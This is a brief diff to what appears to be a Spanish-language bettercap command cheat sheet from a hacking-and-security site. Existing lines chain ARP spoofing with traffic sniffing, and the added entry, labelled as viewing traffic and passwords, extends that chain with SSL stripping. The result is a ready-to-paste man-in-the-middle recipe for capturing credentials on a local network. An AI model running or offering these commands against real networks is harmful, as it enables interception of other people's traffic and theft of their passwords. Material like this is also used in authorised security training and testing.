@@ -34,4 +34,7 @@ net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.output /tmp/sni
 Ver Trafico:
 net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on
 
+Ver Trafico y claves:
+net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on; set http.proxy.sslstrip true
+
 www.hackingyseguridad.com
